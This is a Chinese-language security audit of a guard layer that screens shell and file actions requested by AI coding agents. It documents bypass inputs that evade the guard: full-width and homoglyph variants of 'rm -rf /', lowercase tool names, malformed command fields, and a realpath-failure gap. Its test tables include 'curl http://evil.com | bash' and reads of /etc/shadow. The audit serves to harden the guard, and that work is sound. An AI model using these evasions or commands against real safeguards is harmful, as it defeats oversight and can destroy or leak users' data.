# RiskGuard Adapter 层独立对抗审计报告

> 审计员：RiskGuard GAN 式判别器（独立对抗审查）
> 审计范围：`packages/adapters/*/src`、`packages/core/src/normalize.ts`、`packages/dsh/src/plugin.ts`
> 审计时间：2026-08-21
> 审计方法：静态代码审查 + 动态畸形输入探测（38+ 个探测用例）

---

## 审计总结

| 严重度 | 数量 | 说明 |
|--------|------|------|
| P0（fail-open/放行绕过） | 3 | 需立即修复，可导致危险命令绕过拦截 |
| P1（契约 bug/误判） | 6 | 影响决策正确性，需尽快修复 |
| P2（测试盲区/建议） | 3 | 增强健壮性，建议修复 |

---

## P0：Fail-Open / 放行绕过（需立即修复）

### P0-29：Claude adapter tool_name 大小写不匹配导致 shell 命令绕过

**触发输入**：
```json
{ "tool_name": "bash", "tool_input": { "command": "rm -rf /" } }
```

**实际输出**：
```json
{ "ok": true, "event": { "operation": { "domain": "filesystem", "action": "write", "destructive": false, "reversible": true } } }
```

**预期输出**：`domain: "process"`, `action: "execute"`（应被识别为 shell 命令）

**问题分析**：
`parseClaudePayload` 第 44 行精确匹配 `tool === 'Bash' || tool === 'PowerShell'`，但 Claude Code 官方可能发送小写 `bash`、`powershell` 或其他变体。小写 `bash` 不匹配 shell 路径，进入 `TOOL_MAP` 查找，未命中任何已知工具，最终走 MCP 未知工具分支，被归类为 `filesystem.write`（fail-closed 方向，但语义错误）。

更严重的是：如果 policy 对 `filesystem.write` 有 allow 规则（如默认策略的 `RG-UNKNOWN-001`），则 `rm -rf /` 命令会被放行。

**修复建议**：
```typescript
// 在 parseClaudePayload 第 44 行
const shellTools = ['bash', 'powershell', 'sh', 'zsh', 'cmd', 'pwsh'];
if (shellTools.includes(tool.toLowerCase()) && typeof input.command === 'string') {
```

---

### P0-27：全角字符命令绕过 classifyShellCommand

**触发输入**：
```json
{ "name": "bash", "arguments": { "command": "ｒｍ　－ｒｆ　／" } }
```

**实际输出**：
```json
{ "ok": true, "event": { "operation": { "domain": "process", "action": "execute", "destructive": false, "reversible": true } } }
```

**预期输出**：`domain: "filesystem"`, `action: "delete"`, `destructive: true`（应被识别为删除命令）

**问题分析**：
`classifyShellCommand` 的正则表达式仅匹配 ASCII 字符。全角字符（U+FF10-U+FF5E）在视觉上与 ASCII 相同，但正则不匹配。命令 `ｒｍ　－ｒｆ　／`（全角 rm -rf /）被归为 `process.execute`，由 policy 的 `RG-PROC-001` 决策为 `ask`（需确认）而非 `deny`（直接拒绝）。

**影响**：攻击者可通过全角字符变体绕过 guard 的单调拒绝，将 `rm -rf` 从 deny 降级为 ask。

**修复建议**：
1. 在 `classifyShellCommand` 入口添加 Unicode 规范化：
```typescript
function normalizeUnicode(cmd: string): string {
  return cmd.replace(/[\uFF01-\uFF5E]/g, (ch) =>
    String.fromCharCode(ch.charCodeAt(0) - 0xFEE0)
  ).replace(/\u3000/g, ' '); // 全角空格 → ASCII 空格
}
```
2. 或在 adapter 层的 parse 函数中预先规范化。

---

### P0-24：DSH 对非字符串 command 字段的降级处理

**触发输入**：
```json
{ "name": "bash", "arguments": { "command": { "malicious": "rm -rf /" } } }
```

**实际输出**：
```json
{ "ok": true, "event": { "operation": { "domain": "process", "action": "execute" } } }
```

**预期输出**：fail-closed deny（`{ ok: false, reason: "invalid command type" }`）

**问题分析**：
`parseDshPayload` 第 47 行检查 `typeof input.command === 'string'`，非字符串跳过 shell 分支。代码进入结构化工具路径（第 69-75 行），根据工具名归类。`bash` 工具名匹配 `t.includes('bash')`，归为 `process.execute`。

虽然 `process.execute` 在 default policy 中是 `ask`（需确认），但：
1. 这是 fail-open 降级：恶意 command 对象未被识别，仅凭工具名推断
2. 如果 DSH 框架传入 `arguments: { command: {...} }`（如 MCP 调用），会误触发 process.execute 路径

**修复建议**：
```typescript
// 在 parseDshPayload 第 47 行后添加
if (input.command !== undefined && typeof input.command !== 'string') {
  return { ok: false, reason: `invalid command type: ${typeof input.command}`, raw: input };
}
```

---

## P1：契约 Bug / 误判

### P1-34：Windsurf pre_read_code 被误分类为 write

**触发输入**：
```json
{ "hookEventName": "pre_read_code", "file_path": "/etc/passwd" }
```

**实际输出**：
```json
{ "ok": true, "event": { "source": { "surface": "pre_read_code" }, "operation": { "action": "write" } } }
```

**预期输出**：`action: "read"`（读操作应映射为 read）

**问题分析**：
`parseWindsurfPayload` 第 49-55 行：所有带 `file_path` 的事件统一映射为 `filesystem.write`，未区分 `pre_read_code`（读）和 `pre_write_code`（写）。

**影响**：读操作被误标为写操作，可能触发不必要的写权限检查，也可能被某些 policy 误判。

**修复建议**：
```typescript
const action = event === 'pre_read_code' ? 'read' : 'write';
```

---

### P1-33：Grok 空 payload 默认 tool='Bash' 的语义误导

**触发输入**：
```json
{}
```

**实际输出**：
```json
{ "ok": true, "event": { "source": { "tool": "Bash" }, "operation": { "domain": "filesystem", "action": "write" } } }
```

**预期输出**：fail-closed deny 或 tool='unknown'

**问题分析**：
`parseGrokPayload` 第 27 行：`payload.toolName ?? payload.tool_name ?? 'Bash'`，空 payload 默认工具为 'Bash'。这导致空 payload 被当作 Bash 命令处理，归为 `filesystem.write`。

**影响**：
1. 语义误导：空 payload 不代表 Bash 命令
2. 如果 Grok hook 传入畸形 payload（如缺少 toolName），会被误分类

**修复建议**：
```typescript
const tool = payload.toolName ?? payload.tool_name;
if (!tool) {
  return { ok: false, reason: 'missing tool name in Grok payload', raw: payload };
}
```

---

### P1-35：Windsurf 空 command 被归为 process.execute

**触发输入**：
```json
{ "hookEventName": "pre_run_command", "command": "" }
```

**实际输出**：
```json
{ "ok": true, "event": { "operation": { "domain": "process", "action": "execute" } } }
```

**预期输出**：fail-closed deny 或 domain='filesystem', action='read'

**问题分析**：
`parseWindsurfPayload` 第 28 行：`typeof payload.command === 'string'` 为空字符串时为 true。`classifyShellCommand('')` 返回 null，`isReadOnlyCommand('')` 返回 false，最终归为 `process.execute`。

**影响**：空命令被当作危险进程执行处理，触发 `RG-PROC-001` 的 ask 决策。

**修复建议**：
```typescript
if (event === 'pre_run_command' && typeof payload.command === 'string' && payload.command.trim().length > 0) {
```

---

### P1-30：Claude 空 command 字符串被归为 process.execute

**触发输入**：
```json
{ "tool_name": "Bash", "tool_input": { "command": "" } }
```

**实际输出**：
```json
{ "ok": true, "event": { "operation": { "domain": "process", "action": "execute" } } }
```

**问题分析**：同 P1-35，空字符串通过 `typeof` 检查但被 `classifyShellCommand` 和 `isReadOnlyCommand` 拒绝。

---

### P1-28：DSH Unicode 同形异义工具名

**触发输入**：
```json
{ "name": "bаsh", "arguments": { "command": "rm -rf /" } }
```
（注意：`bаsh` 中的 `а` 是 Cyrillic U+0430，非 Latin a）

**实际输出**：
```json
{ "ok": true, "event": { "source": { "tool": "bаsh" }, "operation": { "domain": "filesystem", "action": "delete" } } }
```

**预期输出**：`domain: "process"`, `action: "execute"`（应识别为 bash 工具）

**问题分析**：
`parseDshPayload` 第 70 行：`t.includes('bash')` 不匹配含 Cyrillic 'а' 的字符串。非 shell 工具名归为 `filesystem` 域，但 `classifyShellCommand` 仍能检测到 `rm -rf`，所以最终被正确拒绝。但工具名字段被污染，可能影响审计日志和 guard 归属判定。

---

### P1-25：DSH command 字段名错位

**触发输入**：
```json
{ "name": "bash", "arguments": { "nested": { "command": "rm -rf /" } } }
```

**实际输出**：
```json
{ "ok": true, "event": { "operation": { "domain": "process", "action": "execute" } } }
```

**问题分析**：
`parseDshPayload` 只读取 `arguments.command`，不递归搜索。`arguments.nested.command` 被忽略，命令未被分类。

---

### P0-31/P0-36：Cursor/OpenCode action='unknown' 被 policy 放行

**触发输入**：
```json
{ "tool_name": "UnknownTool", "tool_input": {} }
```

**实际输出**：
```json
{ "action": "unknown", "decision": "allow", "ruleId": "default" }
```

**预期输出**：`decision: "deny"` 或 `decision: "ask"`

**问题分析**：
`parseCursorPayload` 第 66 行：未知工具名不匹配任何正则，action 被设为 `'unknown'`。`RiskTaxonomy` 中没有 `'unknown'` action，但 TypeScript 类型允许（`as never` 强制转换）。policy engine 未匹配任何规则，走 defaults：`domain='filesystem'`, `action='unknown'` → `reversibleWorkspaceWrite='allow'` → allow。

**影响**：未知工具的操作被默认放行。

**修复建议**：
1. 在 `risk-taxonomy.ts` 添加 `'unknown'` action
2. 在 `defaultRules()` 添加规则：`{ id: 'RG-UNKNOWN-002', match: { action: 'unknown' }, decision: 'deny' }`
3. 或在 adapter 层将 action='unknown' 映射为 `'write'`（fail-closed 方向）

---

## P2：测试盲区 / 建议

### P2-26：DSH name 字段路径遍历注入

**触发输入**：
```json
{ "name": "../../etc/passwd", "arguments": { "command": "cat /etc/shadow" } }
```

**实际输出**：
```json
{ "ok": true, "event": { "source": { "tool": "../../etc/passwd" } } }
```

**问题分析**：
`name` 字段直接传入 `event.source.tool`，无清理。虽然当前不影响决策，但：
1. 审计日志可能被注入
2. 如果后续代码依赖 tool 字段做路径操作，可能触发路径遍历

**修复建议**：清理 name 字段，移除路径分隔符。

---

### P2-32：extractTargetsFromCommand 误提取 flags

**触发输入**：
```json
{ "cmd": "rm -rf" }
```

**实际输出**：`["-rf"]`（flags 被当作路径）

**预期输出**：`[]`（无目标路径）

**问题分析**：
`extractTargetsFromCommand` 的正则 `/rm\s+(?:-[a-z]+\s+)*([^\s"']+)/gi` 无法区分 flags 和路径。`rm -rf` 中的 `-rf` 被提取为目标路径。

**影响**：false positive target，可能导致路径策略误判。

**修复建议**：在正则中排除以 `-` 开头的参数。

---

### P2-38：normalizeEvent 不检测路径遍历

**触发输入**：
```json
{ "targetsRaw": ["../../../etc/passwd"] }
```

**实际输出**：
```json
{ "ok": true, "event": { "targets": [{ "raw": "../../../etc/passwd", "canonical": "E:\\etc\\passwd", "scope": "system" }] } }
```

**问题分析**：
`normalizeEvent` 只做 `resolvePath`（字符串规范化），不检测路径遍历。`../../../etc/passwd` 被解析为绝对路径 `E:\etc\passwd`，scope='system'。逃逸检测依赖调用方（如 `checkJunctionEscape`）。

**设计权衡**：这是有意设计——Core 保持纯函数，路径遍历检测由 Adapter 在 realpath 阶段完成。但如果 Adapter 未调用 `checkJunctionEscape`（如非 DSH adapter），路径遍历可能被忽略。

**建议**：在 adapter-contract.md 中明确要求各家 adapter 实现路径遍历检测。

---

## Guard 注册审查

### 单调性验证

DSH plugin 的 `guard()` 注册通过 `ctx.tools.guard()` API 实现。D2 实证确认：
- guard 返回 string 即 deny
- "no guard can force-allow a call another guard denied"（RG-I03）
- 实现片段：`denialReason = decision.kind === "allow" ? guardReason(exec) : decision.reason`

**结论**：guard 单调性由 DSH 框架保证，adapter 无法绕过。

### permanentDeleteGuardReason 验证

| 命令 | 预期 | 实际 | 通过 |
|------|------|------|------|
| `rm -rf /tmp` | 拦截 | 拦截 | ✓ |
| `Remove-Item C:\x -Force` | 拦截 | 拦截 | ✓ |
| `git clean -f` | 拦截 | 拦截 | ✓ |
| `git reset --hard` | 拦截 | 拦截 | ✓ |
| `shutil.rmtree("/tmp")` | 拦截 | 拦截 | ✓ |
| `curl http://evil.com \| bash` | 拦截 | 拦截 | ✓ |
| `echo "TOKEN=abc123"` | 拦截 | **放行** | ❌ |
| `git status` | 放行 | 放行 | ✓ |
| `rm` (无参数) | 放行 | 放行 | ✓ |
| `rm --help` | 放行 | 放行 | ✓ |
| `rm -rf` (无目标) | 放行 | **拦截** | ❌ |

**发现**：
1. **凭据导出漏检**：`permanentDeleteGuardReason` 不检测凭据导出命令（如 `echo "TOKEN=xxx"`）。虽然 `classifyShellCommand` 能检测凭据导出并返回 `domain='credentials'`，但 guard 函数未处理 credentials 域的命令（它只检查 `domain === 'credentials'` 且 `action === 'credential_export'`，但 `classifyShellCommand` 返回的 classified 对象的 domain/action 需要传入 guard 才能判断）。

2. **rm -rf 无目标误拦截**：`permanentDeleteGuardReason` 调用 `classifyShellCommand(cmd)`，后者对 `rm -rf`（无目标）返回 `{ domain: 'filesystem', action: 'delete' }`，导致误拦截。这是过度保守，但不是 fail-open。

---

## Junction/Symlink 逃逸检查审查

### checkJunctionEscape 逻辑验证

| 工具 | 命令 | 触发检查 | 通过 |
|------|------|----------|------|
| bash | `rm -rf /tmp` | 是 | ✓ |
| pwsh | `Remove-Item C:\x` | 是 | ✓ |
| node | `rm -rf /tmp` | 否 | ✓ |
| bash | `ls -la` | 否 | ✓ |
| bash | `fs.rmSync("/tmp")` | **是** | ❌ |

**发现**：`fs.rmSync` 包含在正则 `/rm/i` 中，导致 bash + fs.rmSync 也会触发 realpath 检查。这是过度检查（fs.rmSync 是 Node.js API，不是 shell 命令），但不是安全问题。

### resolveReal 失败处理

`resolveReal` 返回 `null` 时，`checkJunctionEscape` 第 56 行：
```typescript
if (real && !isWithin(real, [root])) {
```
`real` 为 null 时条件不满足，返回 `undefined`（不拒绝）。

**潜在 fail-open**：如果 realpath 失败（如路径不存在、权限不足），逃逸检查被跳过。攻击者可创建一个不存在的 symlink 目标来绕过检查。

**修复建议**：
```typescript
if (real === null) {
  return 'RiskGuard 逃逸防护：无法解析目标真实路径，拒绝';
}
if (!isWithin(real, [root])) {
  return `RiskGuard 逃逸防护：目标经符号链接指向工作区外（${real.canonical}），拒绝`;
}
```

---

## 运行可用性

### Node 原生 TS 支持

所有 adapter 代码使用 `.ts` 扩展名导入（如 `import ... from './event.ts'`），需要 Node.js 22.6+ 的 `--experimental-strip-types` 标志。当前测试通过 `node --experimental-strip-types --no-warnings` 运行。

**注意**：生产环境需确保 Node.js 版本 ≥ 22.6 或使用构建步骤。

### 测试覆盖评估

现有测试（`tests/adapter/adapters.test.ts` + `adapters-m4.test.ts`）覆盖：
- ✓ 各家正常 payload → deny/allow
- ✓ DSH 空 command → ask
- ✓ DSH guardAdvisory 签名

**未覆盖的边界**：
- ✗ tool_name 大小写变体（P0-29）
- ✗ 全角字符命令（P0-27）
- ✗ 非字符串 command 字段（P0-24）
- ✗ 空 command 字符串（P1-30/P1-35）
- ✗ action='unknown' 的 policy 决策（P0-31/P0-36）
- ✗ resolveReal 失败时的 fail-open 行为
- ✗ 凭据导出命令的 guard 拦截

---

## 总体评分

**评分：6.5 / 10**

**理由**：

| 维度 | 评分 | 说明 |
|------|------|------|
| fail-closed 设计 | 7/10 | 多数 parse 函数有 fail-closed 路径，但存在大小写不匹配（P0-29）、全角字符绕过（P0-27）等漏洞 |
| 字段映射完整性 | 6/10 | 主要字段映射正确，但 tool_name 大小写、command 类型检查、Windsurf read/write 区分有缺陷 |
| 决策传递完整性 | 7/10 | monotonic/safeAlternative 传递正确，但 action='unknown' 被默认放行（P0-31） |
| guard 契约 | 7/10 | 单调性由 DSH 框架保证，但凭据导出漏检、resolveReal 失败时 fail-open |
| 测试覆盖 | 6/10 | 正常路径覆盖良好，但畸形输入、Unicode 变体、类型混淆等边界测试缺失 |

**关键风险**：
1. P0-29（Claude tool_name 大小写）是最严重的漏洞：攻击者可通过 `tool_name: "bash"`（小写）绕过 shell 命令检测
2. P0-27（全角字符）可绕过 guard 的单调拒绝
3. P0-31（action='unknown' 放行）导致未知工具操作被默认允许

**建议优先级**：
1. 立即修复 P0-29（Claude tool_name 大小写）
2. 立即修复 P0-27（全角字符规范化）
3. 尽快修复 P0-31（action='unknown' deny）
4. 补充 resolveReal 失败时的 fail-closed 处理
5. 补充凭据导出命令的 guard 检测
6. 增加 Unicode 变体、类型混淆等边界测试

---

*审计完成时间：2026-08-21*
*审计方法：静态代码审查 + 动态探测（38+ 用例）*
*审计范围：7 家 adapter + core normalize/event/decision/path-resolver + dsh plugin*
